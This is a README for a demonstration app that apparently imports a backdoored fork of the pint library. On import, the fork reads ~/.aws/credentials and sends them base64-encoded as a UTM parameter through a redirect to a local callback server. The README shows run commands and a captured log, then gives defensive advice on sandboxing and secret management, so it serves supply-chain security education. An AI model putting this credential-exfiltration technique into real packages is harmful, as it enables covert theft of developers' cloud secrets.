bad-converter-app
=================

This app quietly uses a fork of [pint](https://pypi.org/project/Pint/) that is backdoored to read AWS credentials.

This test app is meant to run locally on one machine, as to be purposefully useful and lead to exploitation.

Instructions
============

Use `python3` to open a separate callback HTTP server to show you will get the base64-encoded version of `~/.aws/credentials` if a developer is not careful.

```sh
python3 -m http.server 8080 # yes, 8080, not the default 80!
```

You can then use `pipenv` to load the deps and run the app.

```sh
pipenv shell
pipenv install
python3 app.py
# Tada, I gave you a hint but you're tool late!
Sent report b'TmljZSB0cnkgd2lzZSBndXkhCg==' to anonymized metrics server ...
77.7199999999999 degree_Fahrenheit
```

In your other shell, you will once you run the app or run `import pint` from that Python environment you will see the TinyURL redirect works.

```sh
# Logging after you ran `python3 -m http.server 8080` above
Serving HTTP on :: port 8080 (http://[::]:8080/) ...
::1 - - [03/Nov/2021 18:42:25] "GET /?utm_source=TmljZSB0cnkgd2lzZSBndXkhCg== HTTP/1.1" 200 -
```

Decode the content and you will see a wonderful surprise!

```sh
echo 'TmljZSB0cnkgd2lzZSBndXkhCg==' | base64 -D
Nice try wise guy!
```

Yeah, sorry, I am not giving you my sample credentials.

This time it goes to you, but a real malicious actor would use this commmonplace [UTM parameter](https://en.wikipedia.org/wiki/UTM_parameters) used by marketing teams to take your AWS credentials, move between different watering hole servers, or remove the TinyURL redirector URL and disappear. :-)

This scares me! How do I protect myself?
========================================

1. The important rule of thumb: run code from untrusted sources as far away from your tools configured for client work as possible. Do not skip these and just run code directly on your host with your daily driver OS and IDE, even if you isolate the different language environments (`pyenv`, `rvm`, `nvm`, et cetera).

- Hosted solutionss for code use like [GitHub CodeSpaces](https://github.com/features/codespaces) or [vscode.dev](https://vscode.dev/) or [Gitpod](https://gitpod.io).
- Virtual machines properly isolated from your local host filesystem or in the cloud with AWS, Azure, GCP, or alternatives.
- Container solutions isolated from your local filesysteme (no mounts) like `docker` or `lxc`.

2. Use password and secret management tools, do not just leave them in plaintext because "I use full-disk encryption on my work machine." Default to things like `aws-vault`, use environment variables, and clean them as frequently as possible. This example uses AWS, the next demo or a real world attacker will be more persistent and look for anything.

Inspiration
===========

One of my favor vulnerabilities, the [NodeJS event-stream library compromise](https://blog.npmjs.org/post/180565383195/details-about-the-event-stream-incident.html) that put fear in the hearts of many when working in one agency (fortunately, no one was using cryptocurrency wallets at work.)